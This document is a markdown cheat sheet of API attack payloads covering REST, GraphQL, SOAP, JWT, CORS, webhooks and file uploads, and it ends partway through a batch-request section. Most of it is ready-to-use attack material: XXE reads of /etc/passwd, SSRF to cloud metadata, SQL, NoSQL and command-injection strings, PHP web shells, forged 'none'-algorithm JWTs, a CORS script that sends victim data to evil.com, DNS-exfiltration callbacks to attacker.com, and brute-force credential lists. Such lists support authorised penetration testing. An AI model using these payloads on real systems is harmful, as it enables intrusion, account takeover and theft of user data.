# API Specific Payloads

> Complete collection of API testing payloads for REST, GraphQL, SOAP, and other API vulnerabilities. Includes authentication bypass, IDOR, mass assignment, rate limiting, and API-specific injection attacks.

---

## 📋 Table of Contents
- [REST API Payloads](#rest-api-payloads)
- [GraphQL Payloads](#graphql-payloads)
- [SOAP API Payloads](#soap-api-payloads)
- [Authentication & Authorization Bypass](#authentication--authorization-bypass)
- [IDOR (Insecure Direct Object References)](#idor-insecure-direct-object-references)
- [Mass Assignment](#mass-assignment)
- [Parameter Pollution](#parameter-pollution)
- [Rate Limiting & Brute Force](#rate-limiting--brute-force)
- [Business Logic Flaws](#business-logic-flaws)
- [API Versioning Attacks](#api-versioning-attacks)
- [HTTP Method Tampering](#http-method-tampering)
- [Content Type Manipulation](#content-type-manipulation)
- [Caching & Race Conditions](#caching--race-conditions)
- [JWT & Token Attacks](#jwt--token-attacks)
- [API Key Attacks](#api-key-attacks)
- [CORS & SOP Bypass](#cors--sop-bypass)
- [Webhook & Callback Attacks](#webhook--callback-attacks)
- [File Upload API Attacks](#file-upload-api-attacks)
- [Pagination & Filter Exploitation](#pagination--filter-exploitation)
- [Batch Request Attacks](#batch-request-attacks)
- [API Documentation Exploitation](#api-documentation-exploitation)

---

## 🔄 REST API Payloads

### Basic REST Endpoint Fuzzing
```http
# Common API paths
/api
/api/v1
/api/v2
/api/v3
/api/latest
/rest
/rest/v1
/graphql
/graphiql
/playground
/swagger
/swagger-ui
/swagger.json
/swagger.yaml
/api-docs
/api-docs.json
/api-docs.yaml
/openapi.json
/openapi.yaml
/v1
/v2
/v3
/apidocs
/docs
/documentation
/redoc
/rapidoc
```

### REST Parameter Injection

```
# Common parameter names
GET /api/users?user_id=1
GET /api/users?id=1
GET /api/users?userId=1
GET /api/users?UID=1
GET /api/users?userid=1
GET /api/users?username=admin
GET /api/users?email=admin@example.com
GET /api/users?token=123
GET /api/users?api_key=123
GET /api/users?apikey=123
GET /api/users?key=123
GET /api/users?auth=123
GET /api/users?authorization=123
GET /api/users?bearer=123
```

### REST Path Traversal

```
GET /api/users/../admin
GET /api/users/..;/admin
GET /api/users/..%2fadmin
GET /api/users/..%252fadmin
GET /api/users/%2e%2e/admin
GET /api/users/%2e%2e%2fadmin
GET /api/users/....//admin
GET /api/users/..././/admin
GET /api/..;/admin
GET /v1/../v2/admin
GET /api/./../admin
GET /api/%2e%2e%2f%2e%2e%2fadmin
```

### REST Parameter Pollution

```
# Duplicate parameters
GET /api/users?id=1&id=2
GET /api/users?id=1&id=1&id=3
GET /api/users?user_id=1&user_id=2
GET /api/users?user_id=1&user_id[]=2
GET /api/users?user_id=1&user_id=1&user_id=2

# Array parameters
GET /api/users?ids[]=1&ids[]=2
GET /api/users?id[0]=1&id[1]=2
GET /api/users?ids=1,2,3
GET /api/users?ids=1|2|3
GET /api/users?ids=1;2;3
```

## GraphQL Payloads

### GraphQL Introspection Queries

```
# Full schema introspection
query {
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
          ofType {
            name
            kind
          }
        }
      }
    }
    queryType {
      fields {
        name
        args {
          name
          type {
            name
            kind
          }
        }
      }
    }
    mutationType {
      fields {
        name
      }
    }
  }
}

# Get all queries and mutations
query {
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
    mutationType {
      fields {
        name
        description
      }
    }
  }
}

# Get detailed field information
query {
  __type(name: "User") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}

# Get all available directives
query {
  __schema {
    directives {
      name
      description
      locations
      args {
        name
        type {
          name
        }
      }
    }
  }
}
```

### GraphQL Authentication Bypass

```
# Null authentication
query {
  users {
    id
    name
    email
  }
}

# No authentication header
query {
  admin {
    users {
      password
      token
    }
  }
}

# Introspection without auth
query {
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}

# Using aliases to bypass rate limiting
query {
  user1: user(id: 1) {
    name
    email
  }
  user2: user(id: 2) {
    name
    email
  }
  user3: user(id: 3) {
    name
    email
  }
}
```

### GraphQL IDOR & Data Extraction

```
# Sequential ID extraction
query {
  user(id: 1) { id name email password }
  user(id: 2) { id name email password }
  user(id: 3) { id name email password }
}

# Batch query for data extraction
query {
  users(first: 100) {
    edges {
      node {
        id
        name
        email
        phone
        address
        creditCard {
          number
          cvv
          expiry
        }
      }
    }
  }
}

# Deep nested extraction
query {
  users {
    posts {
      comments {
        user {
          email
          password
        }
      }
    }
  }
}

# Using fragments for reuse
query {
  users {
    ...UserFields
  }
}

fragment UserFields on User {
  id
  name
  email
  password
  token
  role
  permissions
}
```

### GraphQL Injection Payloads

```
# SQL injection in GraphQL arguments
{
  user(id: "1' OR '1'='1") {
    name
  }
}

# NoSQL injection
{
  user(username: {"$ne": null}) {
    name
  }
}

# XSS in GraphQL
{
  user(id: "<script>alert('XSS')</script>") {
    name
  }
}

# Command injection
{
  system(cmd: "id; ls -la") {
    output
  }
}

# SSRF via GraphQL
{
  fetch(url: "http://169.254.169.254/latest/meta-data/") {
    content
  }
}
```

### GraphQL Denial of Service

```
# Circular query
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            name
          }
        }
      }
    }
  }
}

# Deep nesting (depth attack)
query {
  level1: user(id: 1) {
    level2: posts {
      level3: comments {
        level4: user {
          level5: posts {
            level6: comments {
              level7: user {
                name
              }
            }
          }
        }
      }
    }
  }
}

# Alias bombing
query {
  a1: user(id: 1) { name }
  a2: user(id: 1) { name }
  a3: user(id: 1) { name }
  # ... repeat 10000 times
  a10000: user(id: 1) { name }
}

# Resource intensive query
query {
  users(first: 1000000) {
    edges {
      node {
        posts(first: 1000) {
          edges {
            node {
              comments(first: 1000) {
                edges {
                  node {
                    content
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

### GraphQL Field Suggestions

```
# Try to find hidden fields
query {
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}

# Common sensitive field names to look for
# password, pass, pwd, secret, token, apiKey, api_key, apikey
# creditCard, credit_card, creditcard, ssn, social_security
# email, phone, address, location, ip, userAgent
# role, isAdmin, is_admin, admin, permissions
# internal, debug, test, dev, staging
```

## SOAP API Payloads

### SOAP XML Injection

```
<!-- Basic SQL injection in SOAP -->
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser>
      <userId>1' OR '1'='1</userId>
    </GetUser>
  </soap:Body>
</soap:Envelope>

<!-- XXE in SOAP -->
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser>
      <userId>&xxe;</userId>
    </GetUser>
  </soap:Body>
</soap:Envelope>

<!-- SSRF in SOAP -->
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser>
      <userId>&xxe;</userId>
    </GetUser>
  </soap:Body>
</soap:Envelope>
```

### SOAP Action Attacks

```
# Missing SOAPAction header
POST /soap-api HTTP/1.1
Host: target.com
Content-Type: text/xml

# Empty SOAPAction
SOAPAction: ""

# Wildcard SOAPAction
SOAPAction: "*"

# Malicious SOAPAction
SOAPAction: "http://target.com/Admin/DeleteAllUsers"

# SOAPAction injection
SOAPAction: "http://target.com/GetUser"../../Admin/DeleteAllUsers
```

## Authentication & Authorization Bypass

### API Token Bypass

```
# Missing token
GET /api/users HTTP/1.1
Host: target.com

# Empty token
Authorization: 
Authorization: null
Authorization: undefined
Authorization: 0
Authorization: false
Authorization: ""

# Invalid token formats
Authorization: Bearer 
Authorization: Bearer null
Authorization: Bearer 0
Authorization: Bearer false
Authorization: Bearer 123
Authorization: Basic 
Authorization: Basic YWRtaW46YWRtaW4=

# Token in different headers
X-API-Key: admin
X-API-Key: 123
API-Key: admin
API-Token: admin
X-Token: admin
Token: admin
Access-Token: admin
X-Access-Token: admin
```

### Parameter-Based Authentication Bypass

```
# URL parameter auth
GET /api/users?api_key=admin
GET /api/users?token=admin
GET /api/users?access_token=admin
GET /api/users?key=admin
GET /api/users?auth=admin

# Body parameter auth
POST /api/users HTTP/1.1
Content-Type: application/json

{
  "api_key": "admin",
  "token": "admin",
  "access_token": "admin",
  "username": "admin",
  "password": "anything"
}

# Cookie-based auth
GET /api/users HTTP/1.1
Cookie: api_key=admin
Cookie: token=admin
Cookie: access_token=admin
Cookie: session=admin
Cookie: PHPSESSID=admin
```

### Privilege Escalation

```
# Role parameter injection
POST /api/users HTTP/1.1
Content-Type: application/json

{
  "username": "newuser",
  "password": "pass",
  "role": "admin",
  "isAdmin": true,
  "is_admin": true,
  "admin": true,
  "permissions": ["*"],
  "accessLevel": 999,
  "privilege": "root"
}

# JWT role modification
{
  "alg": "none",
  "typ": "JWT"
}
{
  "sub": "1234567890",
  "name": "John Doe",
  "role": "admin",
  "isAdmin": true,
  "iat": 1516239022
}

# Header-based privilege escalation
X-Role: admin
X-Admin: true
X-Is-Admin: true
X-Permissions: *
X-Access-Level: 999
X-Privilege: root
X-Sudo: admin
X-Forwarded-User: admin
```

### OAuth/OpenID Attacks

```
# OAuth parameter tampering
GET /oauth/authorize?response_type=token&client_id=victim&redirect_uri=https://attacker.com&scope=admin

# Redirect URI manipulation
redirect_uri=https://attacker.com
redirect_uri=https://victim.com/oauth/callback?redirect=https://attacker.com
redirect_uri=https://victim.com.attacker.com
redirect_uri=https://victim.com@attacker.com

# State parameter bypass
state=
state=123
state=null
state=undefined

# Code injection
GET /oauth/token?grant_type=authorization_code&code=malicious_code&redirect_uri=https://attacker.com

# Token swapping
Authorization: Bearer {victim_token}
X-Original-Token: {attacker_token}
X-Forwarded-Token: {victim_token}
```

## IDOR (Insecure Direct Object References)

### Numeric ID Manipulation

```
# Sequential IDs
GET /api/users/1
GET /api/users/2
GET /api/users/3
GET /api/users/1000
GET /api/users/999999

# ID variations
GET /api/users?id=1
GET /api/users?user_id=1
GET /api/users?userId=1
GET /api/users?UID=1
GET /api/users?uid=1
GET /api/users?id[]=1
GET /api/users?ids[0]=1

# Negative IDs
GET /api/users/-1
GET /api/users/0

# Zero IDs
GET /api/users/0

# Large IDs
GET /api/users/9999999999
```

### UUID/GUID Manipulation

```
# Common UUID formats
GET /api/users/00000000-0000-0000-0000-000000000000
GET /api/users/11111111-1111-1111-1111-111111111111
GET /api/users/ffffffff-ffff-ffff-ffff-ffffffffffff
GET /api/users/aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa

# Incremental UUIDs
GET /api/users/123e4567-e89b-12d3-a456-426614174000
GET /api/users/123e4567-e89b-12d3-a456-426614174001
GET /api/users/123e4567-e89b-12d3-a456-426614174002

# Null UUID
GET /api/users/null
GET /api/users/NULL
```

### Encoded ID Manipulation

```
# Base64 encoded IDs
GET /api/users/MQ== (1)
GET /api/users/Mg== (2)
GET /api/users/Mw== (3)
GET /api/users/MTIz (123)
GET /api/users/YWRtaW4= (admin)

# URL encoded IDs
GET /api/users/%31
GET /api/users/%32
GET /api/users/%33

# Hex encoded IDs
GET /api/users/0x31
GET /api/users/0x32
GET /api/users/0x33

# Hash IDs (try common hashes)
GET /api/users/098f6bcd4621d373cade4e832627b4f6 (test)
GET /api/users/5f4dcc3b5aa765d61d8327deb882cf99 (password)
GET /api/users/21232f297a57a5a743894a0e4a801fc3 (admin)
```

### IDOR via Different HTTP Methods

```
# GET to POST conversion
POST /api/users/1 HTTP/1.1
Content-Type: application/json

{"username": "hacker"}

# PUT/DELETE without auth
PUT /api/users/2 HTTP/1.1
Content-Type: application/json

{"email": "hacker@example.com"}

DELETE /api/users/3

# PATCH with ID in body
PATCH /api/users HTTP/1.1
Content-Type: application/json

{"id": 1, "email": "hacker@example.com"}

# ID in different locations
GET /api/users?user_id=1
POST /api/users/update HTTP/1.1
Content-Type: application/json

{"user_id": 1, "email": "hacker@example.com"}
```

## Mass Assignment

### JSON Mass Assignment

```
// Add extra fields to create admin
{
  "username": "newuser",
  "password": "pass123",
  "email": "user@example.com",
  "role": "admin",
  "is_admin": true,
  "admin": true,
  "isAdmin": true,
  "permissions": ["*"],
  "access_level": 999,
  "privilege": "root",
  "verified": true,
  "active": true,
  "status": "approved",
  "account_type": "premium"
}

// Update restricted fields
{
  "username": "existinguser",
  "email": "hacker@example.com",
  "password": "newpassword",
  "role": "admin",
  "balance": 999999,
  "credit": 1000000,
  "is_verified": true,
  "email_verified": true,
  "phone_verified": true,
  "mfa_enabled": false,
  "locked": false,
  "suspended": false,
  "deleted": false
}

// Add internal fields
{
  "id": 1,
  "_id": "5f8d0d55b6e1a1c2c3d4e5f6",
  "__v": 0,
  "created_at": "2024-01-01",
  "updated_at": "2024-01-01",
  "internal_id": "secret123",
  "api_key": "sk_test_123456",
  "secret": "secretvalue",
  "token": "jwt_token_here",
  "session_id": "sess_123456"
}
```

### XML Mass Assignment

```
<!-- Add extra XML fields -->
<user>
  <username>newuser</username>
  <password>pass123</password>
  <email>user@example.com</email>
  <role>admin</role>
  <is_admin>true</is_admin>
  <permissions>*</permissions>
</user>

<!-- XML attribute injection -->
<user role="admin">
  <username>newuser</username>
  <password>pass123</password>
</user>

<!-- Namespace injection -->
<user xmlns:admin="http://target.com/admin">
  <username>newuser</username>
  <password>pass123</password>
  <admin:privilege>root</admin:privilege>
</user>
```

### Form Data Mass Assignment

```
POST /api/users HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=newuser&password=pass123&email=user@example.com&role=admin&is_admin=true&permissions=*

POST /api/users/update HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="username"

existinguser
------WebKitFormBoundary
Content-Disposition: form-data; name="email"

hacker@example.com
------WebKitFormBoundary
Content-Disposition: form-data; name="role"

admin
------WebKitFormBoundary
Content-Disposition: form-data; name="is_admin"

true
------WebKitFormBoundary--
```

## Parameter Pollution

### HTTP Parameter Pollution (HPP)

```
# Duplicate parameters
GET /api/users?id=1&id=2
GET /api/users?user_id=1&user_id=2
GET /api/users?user_id=1&user_id=1&user_id=3
GET /api/users?id[]=1&id[]=2
GET /api/users?id=1&id=2&id=3

# Array syntax
GET /api/users?ids[]=1&ids[]=2&ids[]=3
GET /api/users?id[0]=1&id[1]=2&id[2]=3
GET /api/users?user[ids][]=1&user[ids][]=2

# Delimiter-based
GET /api/users?ids=1,2,3
GET /api/users?ids=1|2|3
GET /api/users?ids=1;2;3
GET /api/users?ids=1%202%203
GET /api/users?ids=1..2..3

# Mixed cases
GET /api/users?userId=1&userid=2&UserID=3
GET /api/users?ID=1&id=2&Id=3
```

### Parameter Pollution in POST

```
# JSON array pollution
POST /api/users HTTP/1.1
Content-Type: application/json

{
  "id": [1, 2, 3],
  "user_id": [1, 2, 3],
  "ids": "1,2,3",
  "filter": {"id": {"$in": [1,2,3]}}
}

# Form array pollution
POST /api/users HTTP/1.1
Content-Type: application/x-www-form-urlencoded

ids=1&ids=2&ids=3
user_id=1&user_id=2&user_id=3
id=1&id=2&id=3

# Multi-part pollution
POST /api/users HTTP/1.1
Content-Type: multipart/form-data; boundary=xxx

--xxx
Content-Disposition: form-data; name="id"

1
--xxx
Content-Disposition: form-data; name="id"

2
--xxx
Content-Disposition: form-data; name="id"

3
--xxx--
```

## Rate Limiting & Brute Force

### Rate Limit Bypass

```
# IP rotation headers
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 127.0.0.2
X-Forwarded-For: 127.0.0.3
X-Real-IP: 127.0.0.1
X-Real-IP: 127.0.0.2
Client-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1

# User-Agent rotation
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
User-Agent: Mozilla/5.0 (X11; Linux x86_64)

# Parameter variations
/api/login?nocache=1
/api/login?nocache=2
/api/login?timestamp=123456
/api/login?_=123456

# Case variations
/api/Login
/api/LOGIN
/api/LogIn

# Path variations
/api/v1/login
/api/v2/login
/api/latest/login

# Using different endpoints
/api/login
/api/auth/login
/api/authenticate
/api/signin
/api/token

# Request splitting
GET /api/login?username=admin&password=pass1
GET /api/login?username=admin&password=pass2
```

### Brute Force Payloads

```
# Common username list
admin, root, user, test, guest, administrator, support, sales, info, contact, webmaster, api, service, system, oracle, postgres, mysql, sa, sys, dba, operator

# Common password list
password, admin, 123456, 12345, 12345678, qwerty, abc123, password1, 111111, 123123, admin123, letmein, welcome, monkey, dragon, master, hello, football, baseball, 654321, 1234567890

# Email enumeration
admin@, test@, user@, contact@, info@, support@, sales@, billing@, security@, abuse@, postmaster@, webmaster@, hostmaster@, noreply@, no-reply@

# JWT brute force
{"alg":"HS256","typ":"JWT"}
{"sub":"1234567890","name":"John Doe","iat":1516239022}
# Try weak secrets: secret, secretkey, mysecret, jwtsecret, jwtsecretkey
```

## Business Logic Flaws

### Discount/Pricing Manipulation 

```
// Price manipulation
{
  "product_id": 123,
  "quantity": 1,
  "price": 0,
  "total": 0,
  "discount": 100,
  "discount_percentage": 100,
  "coupon": "SUPERDISCOUNT",
  "coupon_code": "FREE100",
  "promo_code": "DISCOUNT100",
  "gift_card": "GIFT100",
  "currency": "USD",
  "amount": -100
}

// Negative quantity
{
  "product_id": 123,
  "quantity": -1,
  "price": 100
}

// Decimal manipulation
{
  "product_id": 123,
  "quantity": 1.5,
  "price": 100
}

// Array injection
{
  "product_id": [123, 456],
  "quantity": [1, -1],
  "price": [100, 100]
}
```

### Quantity/Inventory Exploitation

```
# Order more than available
POST /api/order HTTP/1.1
Content-Type: application/json

{
  "product_id": 123,
  "quantity": 999999
}

# Negative quantity returns
POST /api/order/return HTTP/1.1
Content-Type: application/json

{
  "order_id": 456,
  "quantity": -999999,
  "refund_amount": 999999
}

# Race condition orders
# Send multiple requests simultaneously
POST /api/order HTTP/1.1
Content-Type: application/json

{"product_id": 123, "quantity": 1}

# Send 100 requests at once to order 100 items when only 1 available
```

### Wallet/Points Exploitation

```
// Negative transfers
{
  "from_user": 123,
  "to_user": 456,
  "amount": -1000
}

// Decimal transfers
{
  "from_user": 123,
  "to_user": 456,
  "amount": 0.00000001
}

// Overflow transfers
{
  "from_user": 123,
  "to_user": 456,
  "amount": 9223372036854775807
}

// Negative points redemption
{
  "user_id": 123,
  "points_to_redeem": -1000,
  "value": 1000
}
```

## API Versioning Attacks

### Version Enumeration

```
# Try different version paths
/v1/api/users
/v2/api/users
/v3/api/users
/v1.0/api/users
/v1.1/api/users
/v2.0/api/users
/v1/users
/v2/users
/v3/users
/api/v1/users
/api/v2/users
/api/v3/users
/api/v1.0/users
/rest/v1/users
/rest/v2/users
/rest/v3/users

# Version parameters
GET /api/users?version=1
GET /api/users?version=2
GET /api/users?version=v1
GET /api/users?api_version=1
GET /api/users?ver=1

# Version headers
X-API-Version: 1
X-API-Version: 2
X-API-Version: v1
API-Version: 1
Accept: application/vnd.target.v1+json
Accept: application/vnd.target.v2+json
```

### Version Downgrade Attacks

```
# Access older vulnerable versions
GET /v1/api/admin/users HTTP/1.1
Host: target.com

# Mix versioning
GET /v1/api/users HTTP/1.1
X-API-Version: 2

# Version fallback
GET /api/users HTTP/1.1
Accept: application/vnd.target.v0+json

# Deprecated endpoints
GET /api/v1/deprecated/admin/debug
GET /api/v1/debug
GET /api/v1/test
GET /api/v1/internal
```

## HTTP Method Tampering

### Method Override

```
# Override headers
X-HTTP-Method-Override: DELETE
X-HTTP-Method: DELETE
X-Method-Override: DELETE
X-Forwarded-Method: DELETE
X-Original-Method: DELETE

# POST with override
POST /api/users/1 HTTP/1.1
X-HTTP-Method-Override: DELETE
Content-Type: application/json

# GET with override body
GET /api/users HTTP/1.1
X-HTTP-Method-Override: POST
Content-Type: application/json

{"username": "hacker", "role": "admin"}

# Parameter override
GET /api/users/1?_method=DELETE
POST /api/users/1?_method=DELETE
```

### Uncommon HTTP Methods

```
# Test for vulnerable methods
OPTIONS /api/users
TRACE /api/users
TRACK /api/users
DEBUG /api/users
PROPFIND /api/users
PROPPATCH /api/users
MKCOL /api/users
COPY /api/users
MOVE /api/users
LOCK /api/users
UNLOCK /api/users
PATCH /api/users
PURGE /api/users
CONNECT /api/users

# Method-based bypass
GET /api/admin/users
POST /api/admin/users
PUT /api/admin/users
DELETE /api/admin/users
PATCH /api/admin/users
```

## Content Type Manipulation

### Content Type Bypass

```
# JSON vs Form
POST /api/users HTTP/1.1
Content-Type: application/json

{"role": "admin"}

POST /api/users HTTP/1.1
Content-Type: application/x-www-form-urlencoded

role=admin

# XML vs JSON
POST /api/users HTTP/1.1
Content-Type: application/xml

<user><role>admin</role></user>

# Invalid content types
Content-Type: application/javascript
Content-Type: text/html
Content-Type: text/plain
Content-Type: image/jpeg
Content-Type: multipart/form-data

# Charset manipulation
Content-Type: application/json; charset=utf-16
Content-Type: application/json; charset=utf-7
Content-Type: application/json; charset=utf-32
```

### Content Type Injection

```
# XSS via content type
Content-Type: text/html

<script>alert('XSS')</script>

# XXE via content type
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

# SSRF via content type
Content-Type: application/json

{
  "url": "http://169.254.169.254/latest/meta-data/"
}
```

## Caching & Race Conditions

### Cache Poisoning

```
# Cache keys manipulation
GET /api/users?nocache=1
GET /api/users?cb=123456
GET /api/users?_=123456
GET /api/users?timestamp=123456

# Host header cache poisoning
GET /api/users HTTP/1.1
Host: evil.com
X-Forwarded-Host: evil.com

# Path confusion
GET /api/users/../admin
GET /api/users/.;/admin
GET /api/users/%2e%2e/admin

# Header-based poisoning
X-Forwarded-For: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

### Race Condition (TOCTOU)

```
# Concurrent request script
import requests
import threading

def send_request():
    requests.post('https://target.com/api/redeem', 
                  json={'code': 'ONCE-USE-CODE'})

# Send 100 requests simultaneously
threads = []
for i in range(100):
    t = threading.Thread(target=send_request)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

```
# Race condition payloads
POST /api/voucher/redeem HTTP/1.1
Content-Type: application/json

{"voucher_code": "SINGLE-USE-CODE"}

POST /api/wallet/transfer HTTP/1.1
Content-Type: application/json

{"from": 123, "to": 456, "amount": 1000}

POST /api/vote HTTP/1.1
Content-Type: application/json

{"poll_id": 1, "option": "A", "user_id": 123}

# Send all requests at exactly the same time using Burp Turbo Intruder
```

## JWT & Token Attacks


### JWT Algorithm Confusion

```
// None algorithm
{
  "alg": "none",
  "typ": "JWT"
}
{
  "sub": "1234567890",
  "role": "admin",
  "iat": 1516239022
}

// RS256 to HS256 confusion
// Original RS256 token
{"alg":"RS256","typ":"JWT"}
{"sub":"user","role":"user"}

// Modified to HS256 with public key as secret
{"alg":"HS256","typ":"JWT"}
{"sub":"user","role":"admin"}

// Algorithm downgrade
{"alg":"HS256","typ":"JWT"}
{"alg":"HS384","typ":"JWT"}
{"alg":"HS512","typ":"JWT"}
```

### JWT Claims Injection

```
// Add admin claims
{
  "sub": "1234567890",
  "role": "admin",
  "is_admin": true,
  "admin": true,
  "permissions": ["*"],
  "access_level": 999,
  "privilege": "root",
  "groups": ["admin", "superuser"],
  "scope": "admin"
}

// Token expiration bypass
{
  "exp": 9999999999,
  "nbf": 1,
  "iat": 1
}

// JWT kid injection (SQLi/Path Traversal)
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../dev/null"
}

// JWT x5u SSRF
{
  "alg": "RS256",
  "x5u": "http://169.254.169.254/latest/meta-data/"
}
```

### JWT Token Leakage

```
# Check for token in URL
GET /api/users?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
GET /api/users?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
GET /api/users?access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

# Token in response body
{"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"}

# Token in cookies
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
```

## API Key Attacks

### API Key Bruteforce

```
# Common API key formats
# UUID: 550e8400-e29b-41d4-a716-446655440000
# Hex: 5f4dcc3b5aa765d61d8327deb882cf99
# Base64: dGVzdC1hcGkta2V5
# Mixed: sk_live_4eC39HqLyjWDarjtT1zdp7dc

# Key in different locations
X-API-Key: {key}
X-API-KEY: {key}
X-Api-Key: {key}
API-Key: {key}
APIKEY: {key}
ApiKey: {key}
Authorization: Bearer {key}
Authorization: Basic {base64(key)}
```

### API Key Leakage

```
# Check response bodies
GET /api/configuration
GET /api/settings
GET /api/debug
GET /api/health
GET /api/status
GET /api/env
GET /api/.env
GET /api/config.js
GET /api/site.js
GET /api/app.js

# Check JavaScript files
GET /static/js/main.js
GET /js/app.js
GET /bundle.js
GET /chunk.js
GET /vendor.js
```

## CORS & SOP Bypass

### CORS Misconfiguration

```
# Test with Origin header
Origin: https://evil.com
Origin: null
Origin: https://target.com.evil.com
Origin: https://target.com@evil.com
Origin: https://evil.com/target.com

# Test with wildcard
Origin: https://anything.com

# Credentialed requests
Origin: https://evil.com
Access-Control-Allow-Credentials: true

# Preflight bypass
OPTIONS /api/users HTTP/1.1
Origin: https://evil.com
Access-Control-Request-Method: DELETE
```

### CORS Exploitation POC

```
<!-- Steal data via CORS -->
<script>
fetch('https://target.com/api/users', {
  credentials: 'include'
}).then(response => response.json())
  .then(data => fetch('https://evil.com/steal?data=' + JSON.stringify(data)));
</script>

<!-- CORS with custom headers -->
<script>
fetch('https://target.com/api/admin', {
  method: 'DELETE',
  headers: {
    'X-Custom-Header': 'value'
  },
  credentials: 'include'
});
</script>
```

## Webhook & Callback Attacks

### Webhook Manipulation

```
// SSRF via webhook
{
  "webhook_url": "http://169.254.169.254/latest/meta-data/",
  "callback_url": "http://internal-service/admin",
  "notification_url": "file:///etc/passwd",
  "endpoint": "gopher://localhost:8080/_GET /admin"
}

// DNS exfiltration
{
  "webhook_url": "http://$(whoami).attacker.com/",
  "callback_url": "http://`id`.attacker.com/",
  "notification_url": "http://{system.hostname}.attacker.com/"
}

// Internal service probing
{
  "webhook_url": "http://localhost:8080/admin",
  "webhook_url": "http://127.0.0.1:8080/admin",
  "webhook_url": "http://[::1]:8080/admin",
  "webhook_url": "http://0.0.0.0:8080/admin"
}
```

### Callback Parameter Injection

```
# Callback in URL
GET /api/process?callback=http://evil.com
GET /api/process?cb=http://evil.com
GET /api/process?return_url=http://evil.com
GET /api/process?redirect_uri=http://evil.com

# JSONP callback
GET /api/users?callback=maliciousFunction
GET /api/users?jsonp=maliciousFunction
GET /api/users?cb=maliciousFunction
```

## File Upload API Attacks

### File Type Bypass

```
# Content-Type manipulation
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: text/plain
Content-Type: application/pdf
Content-Type: application/zip

# Double extension
filename="shell.php.jpg"
filename="shell.php.jpeg"
filename="shell.php.png"
filename="shell.jpg.php"
filename="shell.php;.jpg"

# Null byte injection
filename="shell.php%00.jpg"
filename="shell.php\x00.jpg"

# Case manipulation
filename="shell.PHP"
filename="shell.PhP"
filename="shell.pHp"

# MIME type mismatch
Content-Type: image/jpeg (but file is PHP)
```

### Malicious File Content

```
# PHP shell
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php exec($_GET['cmd'], $output); print_r($output); ?>

# JPG polyglot
\xFF\xD8\xFF\xE0<?php system($_GET['cmd']); ?>

# HTML/XSS
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>

# SVG XSS
<svg onload=alert('XSS')>
<svg><script>alert('XSS')</script></svg>

# XXE in XML
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

## Pagination & Filter Exploitation

### Pagination Bypass

```
# Large limit values
GET /api/users?limit=1000000
GET /api/users?per_page=1000000
GET /api/users?pageSize=1000000
GET /api/users?size=1000000
GET /api/users?count=1000000

# Negative values
GET /api/users?limit=-1
GET /api/users?page=-1
GET /api/users?offset=-100

# No limit
GET /api/users?limit=0
GET /api/users?limit=all
GET /api/users?limit=none

# Offset enumeration
GET /api/users?offset=0&limit=10
GET /api/users?offset=10&limit=10
GET /api/users?offset=20&limit=10

# Page enumeration
GET /api/users?page=1
GET /api/users?page=2
GET /api/users?page=3
```

### Filter Injection

```
# SQL injection in filters
GET /api/users?filter=id=1' OR '1'='1
GET /api/users?where=id=1' AND 1=1--
GET /api/users?search=admin' OR '1'='1

# NoSQL injection
GET /api/users?filter={"$where": "sleep(5000)"}
GET /api/users?username={"$ne": null}
GET /api/users?search[$regex]=.*admin.*

# Command injection
GET /api/users?filter=id; ls -la
GET /api/users?search=`id`

# Path traversal in filters
GET /api/users?file=../../../../etc/passwd
GET /api/users?template=../../../etc/passwd
```

## Batch Request Attacks

### GraphQL Batching

```
# Batch multiple operations
[
  {"query": "query { user(id: 1) { name email password } }"},
  {"query": "query { user(id: 2) { name email password } }"},
  {"query": "query { user(id: 3) { name email password } }"}
]

# Batch with mutations
[
  {"query": "mutation { createUser(username: \"hacker\", password: \"pass\") { id } }"},
  {"query": "mutation { promoteUser(id: 1, role: \"admin\") { success } }"},
  {"query": "query { admin { users { password } } }"}
]
```

### REST Batch Requests

```
# Google-style batch
POST /api/batch HTTP/1.1
Content-Type: multipart/mixed; boundary=batch
